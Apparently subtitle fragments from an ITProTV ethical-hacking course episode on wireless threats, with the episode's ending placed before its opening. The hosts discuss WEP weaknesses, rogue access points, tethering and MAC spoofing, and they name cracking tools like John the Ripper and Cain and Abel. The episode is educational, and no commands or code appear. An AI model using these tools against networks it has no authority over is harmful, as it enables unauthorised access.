lithograph?\n\n725\n00:32:53.429 --> 00:32:56.027\n&gt;&gt; I don't know if they'd\nwant my autograph or yours.\n\n726\n00:32:56.027 --> 00:32:59.426\nI'm thinking yours, if you're not-\n&gt;&gt; I'm not the that actually made that.\n\n727\n00:32:59.426 --> 00:33:01.078\n&gt;&gt; That's true, okay.\n&gt;&gt; You're the one who put that\n\n728\n00:33:01.078 --> 00:33:01.792\ntogether so.\n\n729\n00:33:01.792 --> 00:33:03.730\n&gt;&gt; I put my little smiley\nface down at the bottom.\n\n730\n00:33:03.730 --> 00:33:05.850\n&gt;&gt; Yeah, just cuz you never know.\n\n731\n00:33:05.850 --> 00:33:07.200\nThat may be worth something some day.\n\n732\n00:33:07.200 --> 00:33:08.238\nProbably not by the way.\n\n733\n00:33:08.238 --> 00:33:10.327\nI would not bank on that as\na retirement thought process.\n\n734\n00:33:10.327 --> 00:33:12.390\nBut you never know, right?\n\n735\n00:33:12.390 --> 00:33:14.462\nRemember, artists only become\nfamous after they die.\n\n736\n00:33:14.462 --> 00:33:15.439\n&gt;&gt; That's true, so\nI'll never know if I, yeah.\n\n737\n00:33:15.439 --> 00:33:17.348\n&gt;&gt; So\nyou may not want that to be the case,\n\n738\n00:33:17.348 --> 00:33:20.579\njust thought I'd point that out\nin case anybody was wondering.\n\n739\n00:33:20.579 --> 00:33:23.095\nTo remember, weak initialization\nvectors are the downfall,\n\n740\n00:33:23.095 --> 00:33:24.335\none of the key downfalls here.\n\n741\n00:33:24.335 --> 00:33:27.013\nThe smaller the bit size for\nthe initialization vector,\n\n742\n00:33:27.013 --> 00:33:29.987\nthe less likely it is that we\nare gonna have secure encryption.\n\n743\n00:33:29.987 --> 00:33:34.265\nSo we wanna think about that,\nsmall bit size in general, small key size,\n\n744\n00:33:34.265 --> 00:33:38.620\nsmall bit size, small form factor,\nor excuse me, small work factor.\n\n745\n00:33:38.620 --> 00:33:41.240\nSmall key space equals lack of protection,\nright?\n\n746\n00:33:41.240 --> 00:33:44.130\nWe want to have larger values here.\n\n747\n00:33:44.130 --> 00:33:47.570\nThe bigger the space or the bigger\nthe work factor, the bigger the IV,\n\n748\n00:33:47.570 --> 00:33:50.220\nthe better we\nare traditionally in terms of,\n\n749\n00:33:50.220 --> 00:33:53.310\nremember, the time it will\ntake to take down that system.\n\n750\n00:33:53.310 --> 00:33:55.260\nAnd that's really what we're focusing on,\nright?\n\n751\n00:33:55.260 --> 00:33:56.800\nSo, wanna be aware of that.\n\n752\n00:33:56.800 --> 00:33:59.660\nDifferent ways we may be able to\nbreak these encryption systems.\n\n753\n00:33:59.660 --> 00:34:01.814\nRight?\nWe can try to take the information\n\n754\n00:34:01.814 --> 00:34:05.148\noffline, scan it,\ngather a bunch of packets typically.\n\n755\n00:34:05.148 --> 00:34:09.787\nHack away at it offline,\nbrute force attacks are often used,\n\n756\n00:34:09.787 --> 00:34:13.727\npassword cracking programs,\nPwDump, PwDump2.\n\n757\n00:34:13.727 --> 00:34:17.094\nI mentioned things like Kismet and\nNetStumbler, and Cain and\n\n758\n00:34:17.094 --> 00:34:20.090\nAbel have used to gather packets and\nbring them in.\n\n759\n00:34:20.090 --> 00:34:23.310\nWe may be able to use John the Ripper.\n\n760\n00:34:23.310 --> 00:34:27.455\nWe may be able to use Loft Crack,\nan oldie but a goodie, right?\n\n761\n00:34:27.455 --> 00:34:30.941\nThat's one you can look up and\nfind out there on a SourceForge.\n\n762\n00:34:30.941 --> 00:34:31.467\n&gt;&gt; Yep.\n\n763\n00:34:31.467 --> 00:34:33.771\n&gt;&gt; Because they got bought up, that was-\n&gt;&gt; They brought that back I think, yeah.\n\n764\n00:34:33.771 --> 00:34:35.510\n&gt;&gt; Well, they got bought up and then they-\n&gt;&gt; They disappeared for a while.\n\n765\n00:34:35.510 --> 00:34:37.085\n&gt;&gt; They just basically buried it.\n\n766\n00:34:37.085 --> 00:34:38.957\nThe people that bought it just said,\nhey, no more.\n\n767\n00:34:38.957 --> 00:34:40.868\nAnd you can't get it,\nand then if you find it,\n\n768\n00:34:40.868 --> 00:34:44.112\nI think version five may be the last one\nout there that's publicly available.\n\n769\n00:34:44.112 --> 00:34:46.406\nYou can download it, but you need\na license for it because they bought it,\n\n770\n00:34:46.406 --> 00:34:47.408\nthey made it, you had to buy it.\n\n771\n00:34:47.408 --> 00:34:47.981\nIt was like PTP.\n\n772\n00:34:47.981 --> 00:34:51.033\nYou had to start paying for it,\nand then they buried it, and\n\n773\n00:34:51.033 --> 00:34:54.159\nthen like all hell broke loose,\nand that was the end of that.\n\n774\n00:34:54.159 --> 00:34:55.730\n&gt;&gt; [LAUGH]\n&gt;&gt; So just be aware of that,\n\n775\n00:34:55.730 --> 00:34:58.505\nbut obviously you wanna think\nabout the basic blocking and\n\n776\n00:34:58.505 --> 00:35:00.850\ntackling we engage in\nhere to secure things.\n\n777\n00:35:00.850 --> 00:35:04.500\nYou always should be looking\nat making sure we have long,\n\n778\n00:35:04.500 --> 00:35:08.830\nstrong passwords as opposed to\nsmaller passwords for connection.\n\n779\n00:35:08.830 --> 00:35:12.030\nSo whatever the passphrase is,\nmake them as complex as possible.\n\n780\n00:35:12.030 --> 00:35:14.036\nWe talked about this in the last episode.\n\n781\n00:35:14.036 --> 00:35:17.816\nWhere I was saying, the SSID really\nprovides no significant protection if we\n\n782\n00:35:17.816 --> 00:35:19.455\nmake it complex in and of itself.\n\n783\n00:35:19.455 --> 00:35:21.415\nAlthough, you have to give David credit.\n\n784\n00:35:21.415 --> 00:35:23.172\nSo David did chime in on the chat window,\n\n785\n00:35:23.172 --> 00:35:25.754\nI missed it while we were on it\nthe last episode, but he did,\n\n786\n00:35:25.754 --> 00:35:28.460\nto give him credit cuz it was\na great observation that he made.\n\n787\n00:35:28.460 --> 00:35:29.785\nHe did chime in and say, hey,\n\n788\n00:35:29.785 --> 00:35:33.180\na lot of people don't remember that\nSSIDs can have embedded spaces in them.\n\n789\n00:35:33.180 --> 00:35:37.180\nAnd he's absolutely right when he says\nthat, and that can add to complexity.\n\n790\n00:35:37.180 --> 00:35:40.120\nBut as he also points out,\nit's not necessarily any better.\n\n791\n00:35:40.120 --> 00:35:42.700\nIt's just that you're obviously\nmaking it more complex.\n\n792\n00:35:42.700 --> 00:35:46.760\nBut ultimately, we wanna think about\nthe fact that we wanna focus our efforts\n\n793\n00:35:46.760 --> 00:35:48.480\nin the passphrase or password.\n\n794\n00:35:48.480 --> 00:35:51.165\nMaking that complex,\nmakes it a lot harder to connect.\n\n795\n00:35:51.165 --> 00:35:55.117\nBut give credit where credit's due, cuz\nhe did add some value, there was comment.\n\n796\n00:35:55.117 --> 00:35:56.170\nThought it was a great one to make.\n\n797\n00:35:56.170 --> 00:35:59.100\nAnd wanted to recognize it and\ncall it out there for posterity.\n\n798\n00:35:59.100 --> 00:36:01.450\nSo, two thumbs up on that one.\n\n799\n00:36:01.450 --> 00:36:04.310\nSo, thinking about passphrase complexity,\nvery important.\n\n800\n00:36:04.310 --> 00:36:07.080\nClient setting is also choosing\nthe right level of encryption,\n\n801\n00:36:07.080 --> 00:36:11.370\nWPA2 enterprise versus WPA or WEP.\n\n802\n00:36:11.370 --> 00:36:14.240\nI still marvel at the fact\nthat you see a lot of these\n\n803\n00:36:14.240 --> 00:36:17.160\nolder devices that are still in use,\nhave WEP as an option.\n\n804\n00:36:17.160 --> 00:36:18.000\n&gt;&gt; Yes.\n\n805\n00:36:18.000 --> 00:36:20.930\n&gt;&gt; And I still marvel at the fact that\nI will be connecting to systems and\n\n806\n00:36:20.930 --> 00:36:22.900\nI will see that people are using WEP.\n\n807\n00:36:22.900 --> 00:36:24.270\nAnd I'm thinking, well,\nI've got ten minutes,\n\n808\n00:36:24.270 --> 00:36:25.590\nI've got nothing to do between meetings.\n\n809\n00:36:25.590 --> 00:36:29.917\nI could just break out\nthe password cracking tool and\n\n810\n00:36:29.917 --> 00:36:33.857\ngo to town,but then I'm thinking,\nwhat for?\n\n811\n00:36:33.857 --> 00:36:37.142\nI can just get onto the one that's open\nright next door and it won't be a problem.\n\n812\n00:36:37.142 --> 00:36:40.390\nBut just thinking about the fact that\nwe still see that stuffs out there.\n\n813\n00:36:40.390 --> 00:36:43.220\nI mean, in my neighborhood for\ninstance, where I live.\n\n814\n00:36:43.220 --> 00:36:45.393\nAs opposed to the neighborhood\nwhere I don't live.\n\n815\n00:36:45.393 --> 00:36:46.760\nIn my neighborhood, where I live.\n\n816\n00:36:46.760 --> 00:36:48.615\nYou ever say some stuff sometimes\nit comes out of your mouth and\n\n817\n00:36:48.615 --> 00:36:49.694\nyou're thinking, what the hell?\n\n818\n00:36:49.694 --> 00:36:50.602\nWhy did I say that?\n\n819\n00:36:50.602 --> 00:36:51.680\nWhat was the point of that?\n\n820\n00:36:51.680 --> 00:36:52.680\n&gt;&gt; Well, you know, I never do that.\n\n821\n00:36:52.680 --> 00:36:54.000\nYou guys never see me do that, right?\n\n822\n00:36:54.000 --> 00:36:55.860\n&gt;&gt; No, not you.\n\n823\n00:36:55.860 --> 00:36:58.585\nMaster of disaster when it\ncomes to turning a phrase.\n\n824\n00:36:58.585 --> 00:37:00.560\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so when you think about,\n\n825\n00:37:00.560 --> 00:37:05.670\nwhere I live, for instance, I see this\na lot where I'll be between my house and\n\n826\n00:37:05.670 --> 00:37:07.460\nmy in-laws, for instance.\n\n827\n00:37:07.460 --> 00:37:09.440\nThey live several blocks away from us.\n\n828\n00:37:09.440 --> 00:37:14.770\nAnd back and forth, and either with my\ncellphone, or my laptop, or whatever.\n\n829\n00:37:14.770 --> 00:37:18.404\nIf I'm on wireless in their house let's\nsay for instance, or in my sister-in-law's\n\n830\n00:37:18.404 --> 00:37:21.757\nhouse who, it's like the compound,\nlives across the street from my in-laws.\n\n831\n00:37:21.757 --> 00:37:25.442\nIt's kind of crazy, but in that area,\nyour neighbors around and\n\n832\n00:37:25.442 --> 00:37:29.072\nsome of them still actually have\nWEP turned on on their systems.\n\n833\n00:37:29.072 --> 00:37:33.274\nAnd they're just thinking, well, I'm\nsecured, it says don't hack this website,\n\n834\n00:37:33.274 --> 00:37:35.304\nthe default and that what they left it as.\n\n835\n00:37:35.304 --> 00:37:37.924\n&gt;&gt; [CROSSTALK]\n&gt;&gt; Yeah, they just don't know.\n\n836\n00:37:37.924 --> 00:37:41.613\nSo you're adding additional controls,\nand would be helpful as well.\n\n837\n00:37:41.613 --> 00:37:45.708\nThinking about things like,\nusing VPNs to additionally encrypt and\n\n838\n00:37:45.708 --> 00:37:48.329\ntunnel beyond the base of just connection.\n\n839\n00:37:48.329 --> 00:37:52.345\nI shudder, I really just shudder when\nI see people connect to wireless, but\n\n840\n00:37:52.345 --> 00:37:56.888\nthen they're not actually encrypting their\ntraffic as they communicate natively.\n\n841\n00:37:56.888 --> 00:37:59.799\nThey're relying on whatever's there but\nthey're not tunneling on top of that to\n\n842\n00:37:59.799 --> 00:38:02.010\nfurther secure and further defend,\nas we've talked about.\n\n843\n00:38:02.010 --> 00:38:03.752\nAnd that kind of stuff is very important.\n\n844\n00:38:03.752 --> 00:38:06.070\nWe gotta think about that and\nobviously, educate people,\n\n845\n00:38:06.070 --> 00:38:08.370\nhelp them to understand\nwhat's going on there.\n\n846\n00:38:08.370 --> 00:38:11.640\nTo be more not only secure, but\n\n847\n00:38:11.640 --> 00:38:16.140\nwe often don't realize how much data\nis flowing through these systems beyond\n\n848\n00:38:16.140 --> 00:38:21.310\nthe gateway border protections that we\nmay put in place on the wired network.\n\n849\n00:38:21.310 --> 00:38:22.700\nAnd we don't stop and think about that.\n\n850\n00:38:22.700 --> 00:38:26.580\nAnd as I said, the observation I made in\nthe last episode about the fact that we\n\n851\n00:38:26.580 --> 00:38:31.400\nmay see lack of good security on the wired\nside propagating into the wireless,\n\n852\n00:38:31.400 --> 00:38:32.670\nif we have good security on the wireless.\n\n853\n00:38:32.670 --> 00:38:34.170\nThe same thing can happen\ngoing the other way.\n\n854\n00:38:34.170 --> 00:38:37.730\nWe can back flow out of the wireless\narea where we're not secure,\n\n855\n00:38:37.730 --> 00:38:42.060\ninto the wired network across that divide\nwhere we essentially hook up, right?\n\n856\n00:38:42.060 --> 00:38:45.720\nAnd because of that tether, because of\nthat cord, this is a significant issue.\n\n857\n00:38:45.720 --> 00:38:48.610\nSo we really gotta think about it from\nboth sides of the divide to really make\n\n858\n00:38:48.610 --> 00:38:50.230\nsure we understand that.\n\n859\n00:38:50.230 --> 00:38:53.030\n&gt;&gt; All right, Adam, again, a lot of\ngreat information there on wireless.\n\n860\n00:38:53.030 --> 00:38:54.450\nWe took it to the next level.\n\n861\n00:38:54.450 --> 00:38:56.510\nStarted talking about those\nauthentication methods,\n\n862\n00:38:56.510 --> 00:38:59.480\nencryption methods, great stuff there.\n\n863\n00:38:59.480 --> 00:39:01.840\nHope everybody out there\nenjoyed watching this one.\n\n864\n00:39:01.840 --> 00:39:04.579\nSigning off for ITProTV, I'm Mike Rodrick.\n\n865\n00:39:04.579 --> 00:39:08.184\n&gt;&gt; I am, yeah, that's who I am.\n\n866\n00:39:08.184 --> 00:39:08.709\nRight there.\n&gt;&gt; [LAUGH]\n\n867\n00:39:08.709 --> 00:39:10.253\n&gt;&gt; I'm not broadcasting my SSID.\n\n868\n00:39:10.253 --> 00:39:12.393\n&gt;&gt; [LAUGH] There we go, and\nwe'll see you next time.\n\n869\n00:39:12.393 -->

00:00:19.040\nI'm your host Mike Rodrick and today we're\ndoing our Certified Ethical Hacker v9.\n\n4\n00:00:19.040 --> 00:00:20.980\nAnd specifically in this episode,\n\n5\n00:00:20.980 --> 00:00:25.200\nwe're looking at our wireless networks and\nhacking our wireless networks.\n\n6\n00:00:25.200 --> 00:00:28.040\nThis is part three so\nif you missed one of the first two parts,\n\n7\n00:00:28.040 --> 00:00:31.180\nmake sure you go back and review\nthose before you check this one out.\n\n8\n00:00:31.180 --> 00:00:33.290\nOr start at the end and\nwork your way back.\n\n9\n00:00:33.290 --> 00:00:34.720\nWhatever floats your boat.\n\n10\n00:00:34.720 --> 00:00:38.390\nBut here to help us lead the way is Mr.\nAdam Gordon floating right along.\n\n11\n00:00:38.390 --> 00:00:39.530\nHow are you doing Adam?\n\n12\n00:00:39.530 --> 00:00:41.910\n&gt;&gt; Good.\nI was floating and dancing and\n\n13\n00:00:41.910 --> 00:00:45.080\nchecking my wireless network\nwhile you were talking.\n\n14\n00:00:45.080 --> 00:00:45.740\nI'm excited.\n\n15\n00:00:45.740 --> 00:00:46.460\nI'm energized.\n\n16\n00:00:46.460 --> 00:00:48.940\nI'm wirelessly charged to be here.\n\n17\n00:00:48.940 --> 00:00:50.510\nSo let us continue talking.\n\n18\n00:00:50.510 --> 00:00:54.970\nWe have been going through, in great\ndetail by the way, with regards to\n\n19\n00:00:54.970 --> 00:00:59.610\nwireless vocabulary, encryption,\nattacks, concerns how things work.\n\n20\n00:00:59.610 --> 00:01:01.250\nWhen they don't work, why not?\n\n21\n00:01:01.250 --> 00:01:02.170\nWe've talked about all that, but\n\n22\n00:01:02.170 --> 00:01:06.160\nwanna focus a little bit more specifically\nnarrowly down a little bit, narrowly down\n\n23\n00:01:06.160 --> 00:01:09.315\na little bit, that's probably [INAUDIBLE],\nnarrow down a little bit our focus.\n\n24\n00:01:09.315 --> 00:01:11.460\nWe wanna filter, right,\nwe wanna filter our focus.\n\n25\n00:01:11.460 --> 00:01:12.440\n&gt;&gt; [LAUGH]\n&gt;&gt; Tailor and\n\n26\n00:01:12.440 --> 00:01:14.500\nscope as we say in the security world.\n\n27\n00:01:14.500 --> 00:01:16.480\nWe wanna go ahead and\ntalk a bit about wireless threats.\n\n28\n00:01:16.480 --> 00:01:19.400\nYou know, just walk through some\nof the particulars, if you will,\n\n29\n00:01:19.400 --> 00:01:20.540\nof things that can go wrong.\n\n30\n00:01:20.540 --> 00:01:23.680\nMan in the middle attacks, for instance,\nI know we'll talk about those.\n\n31\n00:01:23.680 --> 00:01:26.290\nWe've got a little chart or\nsomething we'll go to, not yet, but\n\n32\n00:01:26.290 --> 00:01:27.975\nwe will take a look at for that.\n\n33\n00:01:27.975 --> 00:01:30.915\nI want to talk in general just at a high\nlevel about what I often refer to as\n\n34\n00:01:30.915 --> 00:01:33.285\nthe blocking and tackling of security.\n\n35\n00:01:33.285 --> 00:01:38.145\nThe basic constructs that we have to\nget right in order to make sure that\n\n36\n00:01:38.145 --> 00:01:42.100\nthe things that can go wrong, if we're not\npaying attention to them, are minimized.\n\n37\n00:01:42.100 --> 00:01:45.830\nAnd so when we think of access control and\nthe threats associated with wireless,\n\n38\n00:01:45.830 --> 00:01:50.700\nwe spoke in the last couple of episodes\nabout the fact that we have to focus in\n\n39\n00:01:50.700 --> 00:01:55.130\nand really be tight on management of\nthings like complexity of passwords and\n\n40\n00:01:55.130 --> 00:01:59.350\npass phrases, so that we have that level\nof control we're looking for there.\n\n41\n00:01:59.350 --> 00:02:03.770\nWant to make sure that we're not\nsusceptible by broadcasting the SSIDs\n\n42\n00:02:03.770 --> 00:02:04.740\nnecessarily.\n\n43\n00:02:04.740 --> 00:02:06.270\nWe did talk about the pro and con of that.\n\n44\n00:02:06.270 --> 00:02:07.840\nI don't think it's a problem\nwith the broadcast.\n\n45\n00:02:07.840 --> 00:02:11.150\nAnd what I was really gonna say with\nthat is not so much broadcast them.\n\n46\n00:02:11.150 --> 00:02:13.340\nBut look not at the broadcasting\nof the SSID but\n\n47\n00:02:13.340 --> 00:02:15.980\nrather at the strength of the wireless\nsignal that's carrying it and\n\n48\n00:02:15.980 --> 00:02:19.660\npropagating it, if we are gonna allow\nit to take place and be seen publicly.\n\n49\n00:02:19.660 --> 00:02:23.060\nWe want to make sure, as we talked about\nwith the antenna conversation, that we cut\n\n50\n00:02:23.060 --> 00:02:27.660\nback on the broadcast strength and signal,\npreventing that signal bleed that goes\n\n51\n00:02:27.660 --> 00:02:30.890\nout beyond the boundary of the buildings,\nso that we don't have drive by's and\n\n52\n00:02:30.890 --> 00:02:35.670\nessentially war driving and\npeople looking at our wireless access.\n\n53\n00:02:35.670 --> 00:02:37.220\nSo important to consider.\n\n54\n00:02:37.220 --> 00:02:39.270\nWe talked about RAPs, Rogue Access Points.\n\n55\n00:02:39.270 --> 00:02:42.570\nWanna make sure we think about\nnot having those up and running.\n\n56\n00:02:42.570 --> 00:02:46.440\nWe've talked about in prior\nepisodes when we did sniffing.\n\n57\n00:02:46.440 --> 00:02:51.730\nWith understanding how potentially we have\na promiscuous modem network card running.\n\n58\n00:02:51.730 --> 00:02:56.380\nAnd how we can find that or detect that\nand talked about some ways to do that.\n\n59\n00:02:56.380 --> 00:03:00.580\nSame concept with access points, there's\nnothing wrong with walking around and\n\n60\n00:03:00.580 --> 00:03:04.160\nfinding out what SSIDs are being used and\nwhat access points may or\n\n61\n00:03:04.160 --> 00:03:05.240\nmay not be running.\n\n62\n00:03:05.240 --> 00:03:08.450\nAnd you should do these random\nsurveys every so often to ensure\n\n63\n00:03:08.450 --> 00:03:12.220\nthat you don't have unknown resources\nbeing deployed in the organization.\n\n64\n00:03:12.220 --> 00:03:16.400\nI can't tell you the number of times I've\ngone on site of customers to do audits or\n\n65\n00:03:16.400 --> 00:03:18.040\nto be there to do work or whatever.\n\n66\n00:03:18.040 --> 00:03:22.070\nAnd we'll find an access point that\nsomebody set up in whatever department it\n\n67\n00:03:22.070 --> 00:03:24.090\nmay be and it's running but\n\n68\n00:03:24.090 --> 00:03:27.305\nnobody really knows who put it there,\nnobody knows that it's there.\n\n69\n00:03:27.305 --> 00:03:29.660\nAnd I'll say, hey,\nwhat do you want me to connect to?\n\n70\n00:03:29.660 --> 00:03:31.660\nAnd I see there's three or\nfour things and what's this thing?\n\n71\n00:03:31.660 --> 00:03:32.550\nAnd someone will say, what's that?\n\n72\n00:03:32.550 --> 00:03:33.510\nWhat do you mean, what's that?\n\n73\n00:03:33.510 --> 00:03:34.800\nThat's not supposed to be there.\n\n74\n00:03:34.800 --> 00:03:36.597\nAnd we go and we look, and sure enough,\n\n75\n00:03:36.597 --> 00:03:39.649\nwe find out that somebody's got\na little wireless setup in there,\n\n76\n00:03:39.649 --> 00:03:43.490\na little cube farm corner of the world\nthere to make it easier for themselves.\n\n77\n00:03:43.490 --> 00:03:46.170\nAnother big thing, and\nwe'll talk about this again in the mobile\n\n78\n00:03:46.170 --> 00:03:49.920\ndevice conversations, and those episodes,\nyou may want to check those out and\n\n79\n00:03:49.920 --> 00:03:54.190\nlook at those, because we've made a lot\nof references to other episodes here.\n\n80\n00:03:54.190 --> 00:03:57.270\nWe've talked extensively about\nthe cryptography conversations, and\n\n81\n00:03:57.270 --> 00:03:59.210\nthose episodes, in the last episode.\n\n82\n00:03:59.210 --> 00:04:03.660\nWe made the reference and\nthe connection between the wireless and\n\n83\n00:04:03.660 --> 00:04:07.530\nthe mobile world in some of the prior\ndiscussions in the last episode.\n\n84\n00:04:07.530 --> 00:04:12.320\nAnd the crossovers there about security\nand things to be aware of with more modern\n\n85\n00:04:12.320 --> 00:04:15.290\nsmart devices that are both\nwireless capable and\n\n86\n00:04:15.290 --> 00:04:17.930\nradio capable traditional\nmobile platforms.\n\n87\n00:04:17.930 --> 00:04:20.590\nSo wanna think about all of that,\nbut one of the things to consider\n\n88\n00:04:20.590 --> 00:04:24.910\nis the fact that when we have\nthese devices, these cell phones,\n\n89\n00:04:24.910 --> 00:04:29.110\nsmart devices that are brought in, and\nwe allow tethering in the organization,\n\n90\n00:04:29.110 --> 00:04:33.560\nI know we talked about this in\nprobably CISSP and maybe in SSCP.\n\n91\n00:04:33.560 --> 00:04:37.960\nI'm sure we would have mentioned it in\nCASP and those episodes in various places.\n\n92\n00:04:37.960 --> 00:04:41.050\nAnd I may have even mentioned\nit with regards to some of\n\n93\n00:04:41.050 --> 00:04:43.000\nthe conversations we\nwould have more broadly\n\n94\n00:04:44.100 --> 00:04:47.680\njust in general around any kind of\nsecurity conversation we would have.\n\n95\n00:04:47.680 --> 00:04:52.220\nUnmonitored, unrestricted tethering of\ndevices in a corporate environment,\n\n96\n00:04:52.220 --> 00:04:54.690\nwhere you are taking\na non-corporate owned asset,\n\n97\n00:04:54.690 --> 00:04:56.164\nessentially a mobile handheld device.\n\n98\n00:04:56.164 --> 00:05:00.330\nYou are either plugging into\nTether because of charging needs.\n\n99\n00:05:00.330 --> 00:05:03.070\nSo a lot of times people\nwill tether their iPhones or\n\n100\n00:05:03.070 --> 00:05:04.960\ntheir android devices or whatever.\n\n101\n00:05:04.960 --> 00:05:07.850\nAnd you will plug it in,\nyou plug one of the charging\n\n102\n00:05:07.850 --> 00:05:10.010\nends into your computer plug\nthe other end into the phone,\n\n103\n00:05:10.010 --> 00:05:13.640\nlet it charge while its on the computer or\nyou will plug it in to sync it.\n\n104\n00:05:13.640 --> 00:05:16.040\nRight, so a lot of times this\nis what we refer to tethering.\n\n105\n00:05:16.040 --> 00:05:18.170\nNot when you plug it\ndirectly into the wall.\n\n106\n00:05:18.170 --> 00:05:20.450\nCuz that's just normally charging.\n\n107\n00:05:20.450 --> 00:05:24.020\nAnd so when we allow tethering to take\nplace and we allow an unrestricted,\n\n108\n00:05:24.020 --> 00:05:26.205\nunmanaged, unknown,\n\n109\n00:05:26.205 --> 00:05:30.820\nnon-corporate asset to be connect to\na corporate asset, that's bad enough.\n\n110\n00:05:30.820 --> 00:05:34.310\nBut then when we allow that to be\ndone while the device is on wireless,\n\n111\n00:05:34.310 --> 00:05:37.610\ntypically it is more often\nthan not on a guest wireless.\n\n112\n00:05:37.610 --> 00:05:39.210\nWhich means it's on an unrestricted,\n\n113\n00:05:39.210 --> 00:05:43.740\nuncontrolled network that now is tethered\nto a restricted controlled network.\n\n114\n00:05:43.740 --> 00:05:47.240\n&gt;&gt; Corporate asset is now on that\nunrestricted uncontrolled network.\n\n115\n00:05:47.240 --> 00:05:50.190\n&gt;&gt; And all your security boundary\nprotections have been violated\n\n116\n00:05:50.190 --> 00:05:53.690\nessentially and bypassed because\nthere's no firewalls, there's no IDS,\n\n117\n00:05:53.690 --> 00:05:56.175\nno IPS most likely,\non these guest networks.\n\n118\n00:05:56.175 --> 00:05:57.260\nSo may be a firewall but\n\n119\n00:05:57.260 --> 00:06:02.400\nit's probably a very limited type and\nnecessarily almost wide open.\n\n120\n00:06:02.400 --> 00:06:03.700\nBecause on guest wireless,\n\n121\n00:06:03.700 --> 00:06:06.690\nif you're doing this the right way and\nsegmenting that physically and\n\n122\n00:06:06.690 --> 00:06:09.710\nlogically off from the other network,\nyou're just running an unrestricted,\n\n123\n00:06:09.710 --> 00:06:13.280\nopen connection for the most part,\nother than just some very basic filtering.\n\n124\n00:06:13.280 --> 00:06:16.720\nThere's probably no IPS or IDS-\n&gt;&gt; Use at your own risk, type publisher.\n\n125\n00:06:16.720 --> 00:06:20.370\n&gt;&gt; Essentially, right, and\nas a result of that, what can happen is,\n\n126\n00:06:20.370 --> 00:06:25.050\nwe've bridged that divide, brought\nthe unrestricted, unmonitored network\n\n127\n00:06:25.050 --> 00:06:29.540\ninto the corporate network behind all of\nthe corporate security controls, right?\n\n128\n00:06:29.540 --> 00:06:33.650\nSo essentially we're bypassing\nthe firewalls, the IDSs, the IPSs.\n\n129\n00:06:33.650 --> 00:06:36.360\nYou know my rant about not\nlooking inward enough, and\n\n130\n00:06:36.360 --> 00:06:39.040\nas a result,\na lot of that focus is outside.\n\n131\n00:06:39.040 --> 00:06:42.430\nAnd we're now behind the perimeter and\nwe're not being monitored carefully.\n\n132\n00:06:42.430 --> 00:06:46.020\nAnd we've opened up an unrestricted,\ncovert channel that's not managed.\n\n133\n00:06:46.020 --> 00:06:50.250\nThat is bridging those two networks and\nI see this happen continuously\n\n134\n00:06:50.250 --> 00:06:53.990\nwhen I'm in corporate offices and\nclients are on site with people.\n\n135\n00:06:53.990 --> 00:06:56.690\nI see this when I do audit work\nwhich is just horrible and\n\n136\n00:06:56.690 --> 00:06:57.970\nhorrendous in and of itself.\n\n137\n00:06:57.970 --> 00:07:01.220\nAnd this is a challenge and\nthis is a challenge in the wireless world.\n\n138\n00:07:01.220 --> 00:07:04.010\nSo access control attacks\nlike this can be problematic.\n\n139\n00:07:04.010 --> 00:07:05.450\nMax spoofing, we've talked about that,\n\n140\n00:07:05.450 --> 00:07:08.890\nshown you how that can be done,\ndid some really nice demos there in\n\n141\n00:07:08.890 --> 00:07:13.200\nthe prior conversations in sniffing\nto show you how that can happen.\n\n142\n00:07:13.200 --> 00:07:14.470\nAP misconfiguration.\n\n143\n00:07:14.470 --> 00:07:18.400\nSo something as silly as choosing\nthe wrong encryption mechanism or\n\n144\n00:07:18.400 --> 00:07:19.400\nwrong methodologies.\n\n145\n00:07:19.400 --> 00:07:22.500\nWe talked about WEP\nversus WPA-2 enterprise.\n\n146\n00:07:22.500 --> 00:07:25.950\nAd hoc associations being allowed,\nand ad hoc associations and\n\n147\n00:07:25.950 --> 00:07:29.315\nassociations between two wireless\ndevices with no access point.\n\n148\n00:07:29.315 --> 00:07:30.730\nSo, a year or\n\n149\n00:07:30.730 --> 00:07:34.870\ntwo ago, Samsung had this whole commercial\nthing going on around their devices.\n\n150\n00:07:34.870 --> 00:07:37.794\nWhere you could just tap them\ntogether was the big thing.\n\n151\n00:07:37.794 --> 00:07:41.310\nTap them to create the ad hoc association\nthrough near-field wireless and\n\n152\n00:07:41.310 --> 00:07:44.432\nBluetooth and they would allow you\nto be able to transmit data, and\n\n153\n00:07:44.432 --> 00:07:47.478\nyou wouldn't have to go through\na wireless solution to do that.\n\n154\n00:07:47.478 --> 00:07:51.560\nSo ad hoc associations can be problematic,\nbecause if I was able to get close enough\n\n155\n00:07:51.560 --> 00:07:54.939\nto your device and touch it I would\nbe able to, in theory, connect and\n\n156\n00:07:54.939 --> 00:07:57.185\nmaybe upload malware and download content.\n\n157\n00:07:57.185 --> 00:07:59.929\nSo things like bluejacking and\nbluesnarfing become problematic,\n\n158\n00:07:59.929 --> 00:08:01.283\nwe'll talk about some of those.\n\n159\n00:08:01.283 --> 00:08:03.620\nPromiscuous clients,\nwe talked about promiscuous mode and\n\n160\n00:08:03.620 --> 00:08:04.959\nthe issues associated with that.\n\n161\n00:08:04.959 --> 00:08:07.535\nSo always know where your client is\nmake sure they're not running around\n\n162\n00:08:07.535 --> 00:08:08.317\n&gt;&gt; [LAUGH]\n\n163\n00:08:08.317 --> 00:08:09.757\n&gt;&gt; Behind your back that's always\n\n164\n00:08:09.757 --> 00:08:10.564\nvery important.\n\n165\n00:08:10.564 --> 00:08:13.430\nUnauthorized association,\nmisdirection, mis-association.\n\n166\n00:08:13.430 --> 00:08:16.430\nThese are all categories of attacks\nthat we have a problem with and\n\n167\n00:08:16.430 --> 00:08:18.310\npotentially want to focus on.\n\n168\n00:08:18.310 --> 00:08:21.220\nWe have to think about integrity attacks,\nfocusing on and\n\n169\n00:08:21.220 --> 00:08:23.420\npotentially dealing with\nthe manipulation of data.\n\n170\n00:08:23.420 --> 00:08:27.440\nWe talked a lot extensively, and\nthe cryptographic conversations both in\n\n171\n00:08:27.440 --> 00:08:31.010\nthe prior episode here specific\nto the wireless discussion and\n\n172\n00:08:31.010 --> 00:08:35.490\nmore broadly in the cryptography section\nwith the episodes there about integrity,\n\n173\n00:08:35.490 --> 00:08:37.920\nabout hashing,\nabout understanding all of that.\n\n174\n00:08:37.920 --> 00:08:39.030\nSo it's very important.\n\n175\n00:08:40.120 --> 00:08:42.590\nSo it's very critical to\nthink about those things and\n\n176\n00:08:42.590 --> 00:08:46.270\nso things like data frame injection,\ndata replay.\n\n177\n00:08:46.270 --> 00:08:49.100\nInitialization vector replay attacks.\n\n178\n00:08:49.100 